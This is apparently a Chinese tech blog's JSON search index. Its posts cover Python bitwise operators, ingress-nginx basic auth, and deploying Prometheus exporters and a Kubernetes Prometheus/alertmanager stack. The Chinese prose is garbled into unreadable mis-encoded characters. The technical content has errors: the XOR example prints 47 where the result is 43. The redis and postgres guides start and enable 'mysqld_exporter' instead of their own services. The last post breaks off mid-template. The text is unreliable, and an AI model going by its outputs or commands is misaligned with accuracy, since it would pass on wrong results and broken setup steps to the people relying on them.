#ä¸‹é¢çš„ä¸è¿ç®—ç»“æœæ˜¯4 \u003e\u003e\u003e a = 15 \u003e\u003e\u003e b = 36 \u003e\u003e\u003e a \u0026 b 4 # è®¡ç®—è¿‡ç¨‹ é¦–å…ˆå°†aå’Œbè½¬æ¢æˆäºŒè¿›åˆ¶è¡¥ç ,æ¯ä¸€ä½è¿›è¡Œä¸è¿ç®—ï¼Œä¸Šä¸‹ä¸¤ä¸ªæ•°éƒ½ä¸º1ç»“æœå°±æ˜¯1ï¼Œå¦åˆ™ä¸º0 a = 0000 1111 = 15 b = 0010 0100 = 36 res = 0000 0100 = 4 ","date":"2020-08-29 22:10","objectID":"/post/1947/:1:0","tags":["python"],"title":"python-ä½è¿ç®—","uri":"/post/1947/"},{"categories":["python"],"content":"2.æŒ‰ä½æˆ–|: \u003e\u003e\u003e a = 15 \u003e\u003e\u003e b = 36 \u003e\u003e\u003e a | b 47 # è®¡ç®—è¿‡ç¨‹ é¦–å…ˆå°†aå’Œbè½¬æ¢æˆäºŒè¿›åˆ¶è¡¥ç ,æ¯ä¸€ä½è¿›è¡Œæˆ–è¿ç®—ï¼Œä¸Šä¸‹ä¸¤ä¸ªæ•°åªè¦æœ‰ä¸€ä¸ªæ•°ä¸º1ç»“æœå°±æ˜¯1ï¼Œå¦åˆ™ä¸º0 a = 0000 1111 = 15 b = 0010 0100 = 36 res = 0010 1111 = 47 ","date":"2020-08-29 22:10","objectID":"/post/1947/:2:0","tags":["python"],"title":"python-ä½è¿ç®—","uri":"/post/1947/"},{"categories":["python"],"content":"3.æŒ‰ä½å¼‚æˆ–^: \u003e\u003e\u003e a = 15 \u003e\u003e\u003e b = 36 \u003e\u003e\u003e a ^ b 47 # è®¡ç®—è¿‡ç¨‹ é¦–å…ˆå°†aå’Œbè½¬æ¢æˆäºŒè¿›åˆ¶è¡¥ç ,æ¯ä¸€ä½è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œä¸Šä¸‹ä¸¤ä¸ªæ•°ç›¸åŒä¸º0ï¼Œä¸åŒä¸º1 a = 0000 1111 = 15 b = 0010 0100 = 36 res = 0010 1011 = 43 ","date":"2020-08-29 22:10","objectID":"/post/1947/:3:0","tags":["python"],"title":"python-ä½è¿ç®—","uri":"/post/1947/"},{"categories":["python"],"content":"4.æŒ‰ä½å–å~: \u003e\u003e\u003e a = 15 \u003e\u003e\u003e ~a -16 #è®¡ç®—è¿‡ç¨‹ é¦–å…ˆå°†aè½¬æ¢æˆäºŒè¿›åˆ¶è¡¥ç ,æ¯ä¸€ä½è¿›è¡Œå–å a = 0000 1111 = 15 not = 1111 0000 = ç¬¦å·ä½ä¸º1(å³è´Ÿæ•°) è¡¥ç  ------------------------------------------------------- #å·²çŸ¥è¡¥ç è®¡ç®—åç (ä¸Šé¢è¯´åˆ°äº†è´Ÿæ•°çš„è¡¥ç =åç +1ï¼Œæ‰€ä»¥è¡¥ç -1=åç ) 1111 0000 - 1 --------------------- 1110 1111 åç  #å·²çŸ¥åç æ±‚åŸç (è´Ÿæ•°çš„åç =åŸç çš„ç¬¦å·ä½ä¸å˜ï¼Œå…¶ä½™å„ä¸ªä½å–åï¼Œ #æ‰€ä»¥æˆ‘ä»¬å°†æ•°å€¼ä½å–åå³å¯ç®—å‡ºåŸç ) 1110 1111 1001 0000 åŸç  #è‡³æ­¤å°±ç®—å‡ºäº†å–ååçš„åŸç ï¼Œæˆ‘ä»¬åœ¨ç”¨8421æ³•å°†äºŒè¿›åˆ¶åŸç æ¢ç®—æˆ10è¿›åˆ¶ï¼Œæœ€åçš„ç»“æœå°±æ˜¯-16 ","date":"2020-08-29 22:10","objectID":"/post/1947/:4:0","tags":["python"],"title":"python-ä½è¿ç®—","uri":"/post/1947/"},{"categories":["python"],"content":"æŒ‰ä½å·¦ç§»\u003c\u003c: \u003e\u003e\u003e a = 15 #å·¦ç§»ä¸¤ä½ \u003e\u003e\u003e a \u003c\u003c 2 60 # è®¡ç®—è¿‡ç¨‹ é¦–å…ˆå°†aè½¬æ¢æˆäºŒè¿›åˆ¶è¡¥ç ï¼Œç„¶åå¾€å·¦è¾¹ç§»åŠ¨ä¸¤ä½ï¼Œå³è¾¹å°‘çš„ä¸¤ä½ç”¨0æ¥è¡¥ a = 0000 1111 = 15 000011 1100 = 60 0011 1100 = 60 ","date":"2020-08-29 22:10","objectID":"/post/1947/:4:1","tags":["python"],"title":"python-ä½è¿ç®—","uri":"/post/1947/"},{"categories":["python"],"content":"æŒ‰ä½å³ç§»åŠ¨\u003e\u003e: \u003e\u003e\u003e a = 15 #å³ç§»ä¸¤ä½ \u003e\u003e\u003e a \u003e\u003e 2 3 # è®¡ç®—è¿‡ç¨‹ é¦–å…ˆå°†aè½¬æ¢æˆäºŒè¿›åˆ¶è¡¥ç ï¼Œç„¶åå¾€å³ç§»åŠ¨ä¸¤ä½ï¼Œå·¦è¾¹å°‘çš„ä¸¤ä½ç”¨0æ¥è¡¥ a = 0000 1111 = 15 0000 0011 = 3 ","date":"2020-08-29 22:10","objectID":"/post/1947/:4:2","tags":["python"],"title":"python-ä½è¿ç®—","uri":"/post/1947/"},{"categories":["kubernetes"],"content":"1.åˆ›å»ºè®¤è¯æ–‡ä»¶(æ³¨æ„æ–‡ä»¶åå¿…é¡»å«auth) htpasswd -bc auth admin 123456 ","date":"2020-08-28 11:00","objectID":"/post/1946/:1:0","tags":["k8s"],"title":"ingress-nginxé…ç½®basicè®¤è¯","uri":"/post/1946/"},{"categories":["kubernetes"],"content":"2.ç”Ÿæˆsecret kubectl create secret generic --from-file=auth --namespace=kube-ops prome-basic-auth ","date":"2020-08-28 11:00","objectID":"/post/1946/:2:0","tags":["k8s"],"title":"ingress-nginxé…ç½®basicè®¤è¯","uri":"/post/1946/"},{"categories":["kubernetes"],"content":"3.é…ç½®ingress apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: prometheus namespace: kube-ops annotations: kubernetes.io/ingress.class: \"nginx\" nginx.ingress.kubernetes.io/auth-type: basic nginx.ingress.kubernetes.io/auth-secret: prome-basic-auth nginx.ingress.kubernetes.io/auth-realm: 'æç¤ºä¿¡æ¯' spec: rules: - host: prom.soulchild.cn http: paths: - path: / backend: serviceName: prometheus servicePort: http ","date":"2020-08-28 11:00","objectID":"/post/1946/:3:0","tags":["k8s"],"title":"ingress-nginxé…ç½®basicè®¤è¯","uri":"/post/1946/"},{"categories":["ç›‘æ§"],"content":"1.ä¸‹è½½æºç ï¼š git clone https://github.com.cnpmjs.org/oliver006/redis_exporter.git cd redis_exporter git checkout v1.6.1 vim exporter.go æ³¨é‡Šç¬¬92è¡Œçš„u.User = nil # æœ¬åœ°æ²¡æœ‰goç¯å¢ƒï¼Œä½¿ç”¨dockerç¼–è¯‘ docker run -it --env=GOPROXY=https://goproxy.cn,direct --workdir=/redis_exporter -v /server/packages/redis_exporter/:/redis_exporter golang:1.15 go build . mv redis_exporter /usr/local/bin/ 2.åˆ¶ä½œå¯åŠ¨æœåŠ¡ï¼š vim /usr/lib/systemd/system/redis_exporter.service [Unit] Description=redis_exporter Documentation=https://github.com/prometheus/redis_exporter After=network.target [Service] Type=simple User=prometheus ExecStart=/usr/local/bin/redis_exporter Restart=on-failure [Install] WantedBy=multi-user.target 4.å¯åŠ¨æœåŠ¡ï¼š systemctl start mysqld_exporter systemctl enable mysqld_exporter 5.é…ç½®prometheusï¼Œå¤šå®ä¾‹ç›‘æ§(å¯ä»¥ä½¿ç”¨æ–‡ä»¶è‡ªåŠ¨å‘ç°) æ‰‹åŠ¨æµ‹è¯•ï¼šlocalhost:9121/scrape?target=redis://h:123123@127.0.0.1:6380 scrape_configs: - job_name: 'redis_exporter' static_configs: - targets: - redis://h:redis@10.0.0.10:6379 - redis://h:123123@10.0.0.10:6380 - redis://h:123456@10.0.0.10:6381 - redis://h:@10.0.0.10:6382 metrics_path: /scrape relabel_configs: - source_labels: [__address__] target_label: __param_target - source_labels: [__param_target] separator: ; regex: redis://h.*@(.*):(\\d+) target_label: instance replacement: ${1}:${2} action: replace - target_label: __address__ replacement: 10.0.0.73:9121 #redis_exporterçš„åœ°å€ç«¯å£ ","date":"2020-08-26 11:12","objectID":"/post/1943/:0:0","tags":["prometheus"],"title":"redis_exporteréƒ¨ç½²é…ç½®å¤šå®ä¾‹","uri":"/post/1943/"},{"categories":["ç›‘æ§"],"content":"1.ä¸‹è½½å®‰è£… wget https://github.91chifun.workers.dev//https://github.com/prometheus/blackbox_exporter/releases/download/v0.17.0/blackbox_exporter-0.17.0.linux-amd64.tar.gz tar xf blackbox_exporter-0.17.0.linux-amd64.tar.gz mv blackbox_exporter-0.17.0.linux-amd64/blackbox_exporter /usr/local/bin/ mkdir /etc/blackbox_exporter mv blackbox_exporter-0.17.0.linux-amd64/blackbox.yml /etc/blackbox_exporter/ 2.æ·»åŠ å¯åŠ¨ç”¨æˆ·ï¼š useradd prometheus chown -R prometheus.prometheus /etc/blackbox_exporter/ 3.ä¿®æ”¹é…ç½®æ–‡ä»¶ su prometheus vim /etc/blackbox_exporter/blackbox.yml modules: http_2xx: prober: http http_post_2xx: prober: http http: method: POST tcp_connect: prober: tcp pop3s_banner: prober: tcp tcp: query_response: - expect: \"^+OK\" tls: true tls_config: insecure_skip_verify: false ssh_banner: prober: tcp tcp: query_response: - expect: \"^SSH-2.0-\" irc_banner: prober: tcp tcp: query_response: - send: \"NICK prober\" - send: \"USER prober prober prober :prober\" - expect: \"PING :([^ ]+)\" send: \"PONG ${1}\" - expect: \"^:[^ ]+ 001\" icmp: prober: icmp example: # è¿™ä¸ªæ˜¯è‡ªå®šä¹‰çš„moduleåç§° prober: http # æ¢æµ‹çš„åè®®ï¼Œæ”¯æŒhttp, dns, tcp, icmp, grpc timeout: 5s # æ¢æµ‹è¶…æ—¶ http: {} # httpåè®®ç›¸å…³å‚æ•° é…ç½®å‚æ•°æ–‡æ¡£ https://github.com/prometheus/blackbox_exporter/blob/master/CONFIGURATION.md 4.é…ç½®å¯åŠ¨æœåŠ¡ï¼š vim /usr/lib/systemd/system/blackbox_exporter.service [Unit] Description=blackbox_exporter Documentation=https://github.com/prometheus/blackbox_exporter After=network.target [Service] Type=simple User=prometheus ExecStart=/usr/local/bin/blackbox_exporter \\ --config.file=/etc/blackbox_exporter/blackbox.yml --history.limit=100 Restart=on-failure [Install] WantedBy=multi-user.target 5.å¯åŠ¨ systemctl start blackbox_exporter.service systemctl enable blackbox_exporter.service 6.é…ç½®prometheus æˆ‘ä»¬è·å–metricsçš„æ–¹å¼ä¸ºå¦‚ä¸‹urlï¼š http://localhost:9115/probe?target=xxx.com\u0026module=http_2xx å…¶ä¸­xxx.comæ˜¯ç›®æ ‡åœ°å€ï¼Œmoduleæ˜¯é…ç½®æ–‡ä»¶ä¸­é…ç½®çš„æ¢æµ‹æ¨¡æ¿,æˆ‘ä»¬çš„ç›®æ ‡åœ°å€ä¸æ˜¯ä¸€ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨æ–‡ä»¶è‡ªåŠ¨å‘ç°åŠ relabel__param_targetæ ‡ç­¾çš„å€¼çš„æ–¹å¼æ¥è¿›è¡Œé…ç½® - job_name: 'blackbox_exporter' metrics_path: /probe params: module: [http_2xx] file_sd_configs: - refresh_interval: 10s files: - blackbox.json relabel_configs: - source_labels: [__address__] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 192.168.0.200:9115 # blackbox_exporterçš„åœ°å€å’Œç«¯å£ blackbox.jsoné…ç½® [{ \"targets\": [\"http://s1.soulchild.cn\"], \"labels\": { \"project\": \"soulchild\", \"env\": \"prod\", \"service\": \"jpress\" } }, { \"targets\": [\"http://s2.soulchild.cn\"], \"labels\": { \"project\": \"soulchild\", \"env\": \"prod\", \"service\": \"app\" } }, { \"targets\": [\"http://1.1.1.1:3221\"], \"labels\": { \"project\": \"soulchild\", \"env\": \"prod\", \"service\": \"server\" } }, { \"targets\": [\"https://soulchild.cn\"], \"labels\": { \"project\": \"soulchild\", \"env\": \"prod\", \"service\": \"blog\" } } ] ","date":"2020-08-26 11:05","objectID":"/post/1942/:0:0","tags":["prometheus"],"title":"blackbox_exporteréƒ¨ç½²","uri":"/post/1942/"},{"categories":["ç›‘æ§"],"content":"1.ä¸‹è½½å®‰è£…ï¼š wget https://github.91chifun.workers.dev//https://github.com/wrouesnel/postgres_exporter/blob/v0.8.0/queries.yaml wget https://github.91chifun.workers.dev//https://github.com/wrouesnel/postgres_exporter/releases/download/v0.8.0/postgres_exporter_v0.8.0_linux-amd64.tar.gz tar xf postgres_exporter_v0.8.0_linux-amd64.tar.gz mv postgres_exporter_v0.8.0_linux-amd64/postgres_exporter /usr/local/bin/ mkdir /etc/postgres_exporter/ mv queries.yaml /etc/postgres_exporter/ chown -R postgres.postgres /etc/postgres_exporter/ queries.yamlæ–‡ä»¶ä¸ºè‡ªå®šä¹‰æŒ‡æ ‡æ–‡ä»¶ï¼Œæœ‰éœ€è¦çš„è¯å¯ä»¥è‡ªå®šä¹‰ã€‚ 2.åˆ›å»ºæ•°æ®åº“ç›‘æ§ç”¨æˆ·ã€å‡½æ•°ã€è§†å›¾ï¼š -- To use IF statements, hence to be able to check if the user exists before -- attempting creation, we need to switch to procedural SQL (PL/pgSQL) -- instead of standard SQL. -- More: https://www.postgresql.org/docs/9.3/plpgsql-overview.html -- To preserve compatibility with \u003c9.0, DO blocks are not used; instead, -- a function is created and dropped. CREATE OR REPLACE FUNCTION __tmp_create_user() returns void as $$ BEGIN IF NOT EXISTS ( SELECT -- SELECT list can stay empty for this FROM pg_catalog.pg_user WHERE usename = 'postgres_exporter') THEN CREATE USER postgres_exporter; END IF; END; $$ language plpgsql; SELECT __tmp_create_user(); DROP FUNCTION __tmp_create_user(); ALTER USER postgres_exporter WITH PASSWORD '123456'; ALTER USER postgres_exporter SET SEARCH_PATH TO postgres_exporter,pg_catalog; -- If deploying as non-superuser (for example in AWS RDS), uncomment the GRANT -- line below and replace \u003cMASTER_USER\u003e with your root user. -- GRANT postgres_exporter TO \u003cMASTER_USER\u003e; CREATE SCHEMA IF NOT EXISTS postgres_exporter; GRANT USAGE ON SCHEMA postgres_exporter TO postgres_exporter; GRANT CONNECT ON DATABASE postgres TO postgres_exporter; CREATE OR REPLACE FUNCTION get_pg_stat_activity() RETURNS SETOF pg_stat_activity AS $$ SELECT * FROM pg_catalog.pg_stat_activity; $$ LANGUAGE sql VOLATILE SECURITY DEFINER; CREATE OR REPLACE VIEW postgres_exporter.pg_stat_activity AS SELECT * from get_pg_stat_activity(); GRANT SELECT ON postgres_exporter.pg_stat_activity TO postgres_exporter; CREATE OR REPLACE FUNCTION get_pg_stat_replication() RETURNS SETOF pg_stat_replication AS $$ SELECT * FROM pg_catalog.pg_stat_replication; $$ LANGUAGE sql VOLATILE SECURITY DEFINER; CREATE OR REPLACE VIEW postgres_exporter.pg_stat_replication AS SELECT * FROM get_pg_stat_replication(); GRANT SELECT ON postgres_exporter.pg_stat_replication TO postgres_exporter; 3.åˆ›å»ºå¯åŠ¨æœåŠ¡ vim /usr/lib/systemd/system/postgres_exporter.service [Unit] Description=postgres_exporter Documentation=https://github.com/wrouesnel/postgres_exporter After=network.target [Service] Type=simple User=postgres Environment=\"DATA_SOURCE_NAME=postgresql://postgres_exporter:123456@localhost:5432/postgres?sslmode=disable\" ExecStart=/usr/local/bin/postgres_exporter --log.level=error # --extend.query-path=quires.yaml Restart=on-failure [Install] WantedBy=multi-user.target 4.å¯åŠ¨æœåŠ¡ systemctl start mysqld_exporter systemctl enable mysqld_exporter 5.é…ç½®prometheus scrape_configs: - job_name: postgres_exporter static_configs: - targets: ['10.0.0.72:9187'] labels: instance: 'test-db' ","date":"2020-08-26 11:03","objectID":"/post/1940/:0:0","tags":["prometheus"],"title":"postgres_exporteréƒ¨ç½²","uri":"/post/1940/"},{"categories":["ç›‘æ§"],"content":"1.ä¸‹è½½å®‰è£…ï¼š wget https://github.91chifun.workers.dev//https://github.com/percona/mongodb_exporter/releases/download/v0.11.1/mongodb_exporter-0.11.1.linux-amd64.tar.gz mkdir mongodb_exporter tar xf mongodb_exporter-0.11.1.linux-amd64.tar.gz -C mongodb_exporter mv mongodb_exporter/mongodb_exporter /usr/local/bin/ 2.åˆ›å»ºmongodbç›‘æ§ç”¨æˆ· db.getSiblingDB(\"admin\").createUser({ user: \"mongodb_exporter\", pwd: \"123456\", roles: [ { role: \"clusterMonitor\", db: \"admin\" }, { role: \"read\", db: \"local\" } ] }) 3.è®¾ç½®å¯åŠ¨æœåŠ¡ vim /usr/lib/systemd/system/mongodb_exporter.service [Unit] Description=mongodb_exporter Documentation=https://github.com/percona/mongodb_exporter After=network.target [Service] Type=simple User=prometheus Environment=\"MONGODB_URI=mongodb://mongodb_exporter:123456@localhost:27017\" ExecStart=/usr/local/bin/mongodb_exporter --log.level=error \\ --collect.database \\ --collect.collection \\ --collect.topmetrics \\ --collect.indexusage \\ --collect.connpoolstats Restart=on-failure [Install] WantedBy=multi-user.target 4.é…ç½®prometheus - job_name: mongodb_exporter static_configs: - targets: ['10.0.0.72:9216'] ","date":"2020-08-26 11:02","objectID":"/post/1939/:0:0","tags":["prometheus"],"title":"mongodb_exporteréƒ¨ç½²","uri":"/post/1939/"},{"categories":["ç›‘æ§"],"content":"1.ä¸‹è½½å®‰è£…ï¼š wget https://github.91chifun.workers.dev//https://github.com/prometheus/mysqld_exporter/releases/download/v0.12.1/mysqld_exporter-0.12.1.linux-amd64.tar.gz tar xf mysqld_exporter-0.12.1.linux-amd64.tar.gz mv mysqld_exporter-0.12.1.linux-amd64/mysqld_exporter /usr/local/bin/mysqld_exporter 2.åˆ›å»ºç›‘æ§ç”¨æˆ·ï¼š CREATE USER 'exporter'@'localhost' IDENTIFIED BY '123456' WITH MAX_USER_CONNECTIONS 3; GRANT PROCESS, REPLICATION CLIENT, SELECT ON *.* TO 'exporter'@'localhost'; 3.åˆ¶ä½œå¯åŠ¨æœåŠ¡ï¼š vim /usr/lib/systemd/system/mysqld_exporter.service [Unit] Description=mysqld_exporter Documentation=https://github.com/prometheus/mysqld_exporter After=network.target [Service] Type=simple User=mysql Environment=DATA_SOURCE_NAME=exporter:123456@(localhost:3306)/ ExecStart=/usr/local/bin/mysqld_exporter --web.listen-address=0.0.0.0:9104 \\ --log.level=error \\ --collect.info_schema.innodb_metrics \\ --collect.info_schema.innodb_tablespaces \\ --collect.info_schema.innodb_cmp \\ --collect.info_schema.innodb_cmpmem Restart=on-failure [Install] WantedBy=multi-user.target 4.å¯åŠ¨æœåŠ¡ï¼š systemctl start mysqld_exporter systemctl enable mysqld_exporter 5.æµ‹è¯•metrics curl localhost:9104/metrics 6.é…ç½®prometheus scrape_configs: - job_name: mysqld_exporter static_configs: - targets: ['10.0.0.73:9104'] ","date":"2020-08-26 11:01","objectID":"/post/1936/:0:0","tags":["prometheus"],"title":"mysqld_exporteréƒ¨ç½²","uri":"/post/1936/"},{"categories":["ç›‘æ§"],"content":"ä¸‹è½½å®‰è£…node_exporterï¼š wget https://github.91chifun.workers.dev//https://github.com/prometheus/node_exporter/releases/download/v1.0.1/node_exporter-1.0.1.linux-amd64.tar.gz tar xf node_exporter-1.0.1.linux-amd64.tar.gz cd node_exporter-1.0.1.linux-amd64/ mv node_exporter /usr/local/bin/ æ·»åŠ å¯åŠ¨ç”¨æˆ·ï¼š useradd prometheus é…ç½®å¯åŠ¨æœåŠ¡ï¼š vim /usr/lib/systemd/system/node_exporter.service [Unit] Description=node_export Documentation=https://github.com/prometheus/node_exporter After=network.target [Service] Type=simple User=prometheus ExecStart=/usr/local/bin/node_exporter Restart=on-failure [Install] WantedBy=multi-user.target å¯åŠ¨ï¼š systemctl start node_exporter.service systemctl enable node_exporter.service æ·»åŠ prometheusé…ç½®ï¼š - job_name: database_node_exporter static_configs: - targets: ['10.0.0.72:9100','10.0.0.73:9100'] ","date":"2020-08-26 11:00","objectID":"/post/1935/:0:0","tags":["prometheus"],"title":"node_exporteréƒ¨ç½²","uri":"/post/1935/"},{"categories":["ç›‘æ§","kubernetes"],"content":"ä¸€ã€prometheus ","date":"2020-08-26 10:53","objectID":"/post/1933/:1:0","tags":["k8s","prometheus"],"title":"k8séƒ¨ç½²prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["ç›‘æ§","kubernetes"],"content":"1.åˆ›å»ºpvã€pvc apiVersion: v1 kind: PersistentVolume metadata: name: prometheus spec: capacity: storage: 10Gi accessModes: - ReadWriteOnce persistentVolumeReclaimPolicy: Retain nfs: server: 10.0.0.10 path: /nfsdata/ --- apiVersion: v1 kind: PersistentVolumeClaim metadata: name: prometheus namespace: kube-ops spec: accessModes: - ReadWriteOnce resources: requests: storage: 10Gi ","date":"2020-08-26 10:53","objectID":"/post/1933/:1:1","tags":["k8s","prometheus"],"title":"k8séƒ¨ç½²prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["ç›‘æ§","kubernetes"],"content":"2.é…ç½®rbac apiVersion: v1 kind: ServiceAccount metadata: name: prometheus namespace: kube-ops --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: prometheus rules: - apiGroups: - \"\" resources: - nodes - services - endpoints - pods - nodes/proxy verbs: - get - list - watch - apiGroups: - \"\" resources: - configmaps - nodes/metrics verbs: - get - nonResourceURLs: - /metrics verbs: - get --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: prometheus roleRef: apiGroup: \"\" kind: ClusterRole name: prometheus subjects: - kind: ServiceAccount name: prometheus namespace: kube-ops ","date":"2020-08-26 10:53","objectID":"/post/1933/:1:2","tags":["k8s","prometheus"],"title":"k8séƒ¨ç½²prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["ç›‘æ§","kubernetes"],"content":"3.åˆ›å»ºservice apiVersion: v1 kind: Service metadata: name: prometheus namespace: kube-ops annotations: prometheus.io/scrape: \"true\" prometheus.io/port: \"9090\" spec: selector: app: prometheus type: NodePort ports: - name: http port: 9090 targetPort: http nodePort: 30002 ","date":"2020-08-26 10:53","objectID":"/post/1933/:1:3","tags":["k8s","prometheus"],"title":"k8séƒ¨ç½²prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["ç›‘æ§","kubernetes"],"content":"4.åˆ›å»ºconfigmap apiVersion: v1 kind: ConfigMap metadata: name: prometheus-conf namespace: kube-ops data: rules.yml: | groups: - name: ç³»ç»Ÿç¡¬ä»¶å‘Šè­¦ rules: - alert: NodeFilesystemUsage expr: (node_filesystem_size_bytes{mountpoint=\"/rootfs\"} - node_filesystem_free_bytes{mountpoint=\"/rootfs\"} ) / node_filesystem_size_bytes{mountpoint=\"/rootfs\"} * 100 \u003e 80 for: 10s labels: filesystem: node annotations: summary: \"{{ $labels.instance }}:ç£ç›˜ä½¿ç”¨é‡\" description: \"{{ $labels.instance }}: rootfsä½¿ç”¨{{ $value }},å¤§äºæ€»å®¹é‡çš„80%\" - alert: NodeMemoryUsage expr: (node_memory_MemTotal_bytes - (node_memory_MemFree_bytes + node_memory_Buffers_bytes + node_memory_Cached_bytes)) / node_memory_MemTotal_bytes * 100 \u003e 90 for: 10s labels: team: node annotations: summary: \"{{ $labels.instance }}: nodeèŠ‚ç‚¹å†…å­˜ä½¿ç”¨è¿‡é«˜\" description: \"{{ $labels.instance }}: å†…å­˜ä½¿ç”¨å¤§äº90%ï¼Œå½“å‰å·²ç”¨{{ $value }}%\" prometheus.yml: | global: scrape_interval: 15s evaluation_interval: 15s alerting: alertmanagers: - static_configs: - targets: [\"alertmanager:9093\"] rule_files: - \"/etc/prometheus/rules.yml\" # - \"second.rules\" scrape_configs: - job_name: prometheus static_configs: - targets: ['localhost:9090'] - job_name: node_exporter kubernetes_sd_configs: - role: node relabel_configs: - source_labels: [__address__] regex: \"(.*):10250\" target_label: __address__ replacement: \"${1}:9100\" - action: labelmap regex: \"__meta_kubernetes_node_label_(.*)\" - job_name: 'kubernetes-kubelet' scheme: https tls_config: ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt insecure_skip_verify: true bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token kubernetes_sd_configs: - role: node relabel_configs: - action: labelmap regex: __meta_kubernetes_node_label_(.+) - job_name: 'kubernetes-cadvisor' kubernetes_sd_configs: - role: node scheme: https tls_config: ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt insecure_skip_verify: true bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token relabel_configs: - action: labelmap regex: __meta_kubernetes_node_label_(.+) - action: replace source_labels: [__meta_kubernetes_node_name] regex: (.*) target_label: __metrics_path__ replacement: /api/v1/nodes/${1}/proxy/metrics/cadvisor - action: replace source_labels: [__address__] target_label: __address__ replacement: kubernetes.default.svc:443 - job_name: 'kubernetes-api-services' scheme: https tls_config: ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token kubernetes_sd_configs: - role: endpoints relabel_configs: - action: replace source_labels: [__address__] target_label: __address__ replacement: kubernetes.default:443 - action: keep source_labels: [__meta_kubernetes_namespace,__meta_kubernetes_endpoint_port_name,__meta_kubernetes_service_name] regex: default;https;kubernetes - action: labelmap regex: __meta_kubernetes_(.+) - job_name: 'kubernetes-service-endpoints' kubernetes_sd_configs: - role: endpoints relabel_configs: - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_scrape] action: keep regex: true # å°†labelæ ‡ç­¾ä¸­çš„ç«¯å£æ›¿æ¢ä¸ºannotationsä¸­æŒ‡å®šçš„ç«¯å£ - action: replace source_labels: [__address__,__meta_kubernetes_service_annotation_prometheus_io_port] target_label: __address__ regex: (.*?):(\\d+);(\\d+) replacement: ${1}:${3} # åŠ¨æ€è·å–schemeï¼Œç¡®ä¿httpå’Œhttpséƒ½å¯ä»¥è¿›è¡Œé‡‡é›† - action: replace source_labels: [__meta_kubernetes_service_annotation_prometheus_io_scheme] target_label: __scheme__ regex: (https?) - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_path] action: replace target_label: __metrics_path__ regex: (.+) - source_labels: [__address__, __meta_kubernetes_service_annotation_prometheus_io_port] action: replace target_label: __address__ regex: ([^:]+)(?::\\d+)?;(\\d+) replacement: $1:$2 - action: labelmap regex: __meta_kubernetes_service_label_(.+) - source_labels: [__meta_kubernetes_namespace] action: replace target_label: kubernetes_namespace - source_labels: [__meta_kubernetes_service_name] a","date":"2020-08-26 10:53","objectID":"/post/1933/:1:4","tags":["k8s","prometheus"],"title":"k8séƒ¨ç½²prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["ç›‘æ§","kubernetes"],"content":"5.éƒ¨ç½²node_exporter apiVersion: extensions/v1beta1 kind: DaemonSet metadata: name: node-exporter namespace: kube-ops labels: name: node-exporter spec: template: metadata: labels: name: node-exporter spec: hostPID: true hostIPC: true hostNetwork: true containers: - name: node-exporter image: prom/node-exporter:v0.16.0 ports: - containerPort: 9100 resources: requests: cpu: 0.15 securityContext: privileged: true args: - --path.procfs - /host/proc - --path.sysfs - /host/sys - --collector.filesystem.ignored-mount-points - '\"^/(sys|proc|dev|host|etc)($|/)\"' volumeMounts: - name: dev mountPath: /host/dev - name: proc mountPath: /host/proc - name: sys mountPath: /host/sys - name: rootfs mountPath: /rootfs tolerations: - key: \"node-role.kubernetes.io/master\" operator: \"Exists\" effect: \"NoSchedule\" volumes: - name: proc hostPath: path: /proc - name: dev hostPath: path: /dev - name: sys hostPath: path: /sys - name: rootfs hostPath: path: / ","date":"2020-08-26 10:53","objectID":"/post/1933/:1:5","tags":["k8s","prometheus"],"title":"k8séƒ¨ç½²prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["ç›‘æ§","kubernetes"],"content":"6.éƒ¨ç½²prometheus deployment apiVersion: extensions/v1beta1 kind: Deployment metadata: name: prometheus namespace: kube-ops labels: app: prometheus spec: selector: matchLabels: app: prometheus template: metadata: labels: app: prometheus spec: serviceAccountName: prometheus containers: - name: prometheus image: prom/prometheus:v2.15.2 command: - \"/bin/prometheus\" args: - \"--config.file=/etc/prometheus/prometheus.yml\" - \"--storage.tsdb.path=/prometheus\" - \"--storage.tsdb.retention=7d\" - \"--web.enable-admin-api\" - \"--web.enable-lifecycle\" ports: - name: http containerPort: 9090 protocol: TCP volumeMounts: - name: config mountPath: \"/etc/prometheus\" - name: data subPath: prometheus mountPath: \"/prometheus\" resources: requests: cpu: 0.05 memory: 512Mi limits: cpu: 1 memory: 2Gi volumes: - name: config configMap: name: prometheus-conf - name: data persistentVolumeClaim: claimName: prometheus ","date":"2020-08-26 10:53","objectID":"/post/1933/:1:6","tags":["k8s","prometheus"],"title":"k8séƒ¨ç½²prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["ç›‘æ§","kubernetes"],"content":"äºŒã€alertmanager 1.configmap apiVersion: v1 kind: ConfigMap metadata: name: alert-config namespace: kube-ops data: wechat.tmpl: |- {{ define \"__alert_list\" }}{{ range . -}} å‘Šè­¦åç§°: {{ index .Annotations \"summary\" }} å‘Šè­¦çº§åˆ«: {{ .Labels.severity }} å‘Šè­¦ä¸»æœº: {{ .Labels.instance }} å‘Šè­¦ä¿¡æ¯: {{ index .Annotations \"description\" }} ç»´æŠ¤å›¢é˜Ÿ: {{ .Labels.team | toUpper }} å‘Šè­¦æ—¶é—´: {{ .StartsAt.Format \"2006-01-02 15:04:05\" }} ------------------------------ {{ end -}}{{ end }} {{ define \"__resolved_list\" }}{{ range . -}} å‘Šè­¦åç§°: {{ index .Annotations \"summary\" }} å‘Šè­¦çº§åˆ«: {{ .Labels.severity }} 